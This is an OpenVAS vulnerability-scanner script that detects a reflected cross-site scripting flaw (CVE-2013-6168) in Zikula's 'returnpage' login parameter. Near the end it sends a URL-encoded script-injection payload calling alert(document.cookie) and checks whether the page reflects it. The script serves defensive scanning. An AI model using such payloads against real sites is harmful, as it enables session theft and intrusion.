###############################################################################
# OpenVAS Vulnerability Test
#
# Zikula returnpage Cross Site Scripting Vulnerability
#
# Authors:
# Shashi Kiran N <nskiran@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:zikula:zikula_application_framework";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803962");
  script_version("2022-04-25T14:50:49+0000");
  script_cve_id("CVE-2013-6168");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2022-04-25 14:50:49 +0000 (Mon, 25 Apr 2022)");
  script_tag(name:"creation_date", value:"2013-11-15 17:56:51 +0530 (Fri, 15 Nov 2013)");
  script_name("Zikula returnpage Cross Site Scripting Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_zikula_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("zikula/detected");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML
  script code in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"Zikula Application Framework version prior to 1.3.6 build 19.");

  script_tag(name:"insight", value:"An error exists in the index.php script which fails to properly sanitize
  user-supplied input to 'returnpage' parameter.");

  script_tag(name:"solution", value:"Upgrade to Zikula Application Framework version to 1.3.6 build 19 or later.");

  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP GET request and check whether
  it is able to read the string or not.");

  script_tag(name:"summary", value:"Zikula is prone to a cross-site scripting (XSS) vulnerability.");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/88654");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/63186");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/124009");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

url = dir + "/index.php?module=users&type=user&func=login&returnpage=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E";
if( http_vuln_check( port:port, url:url, check_header:TRUE, pattern:"<script>alert\(document.cookie\);</script>" ) ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
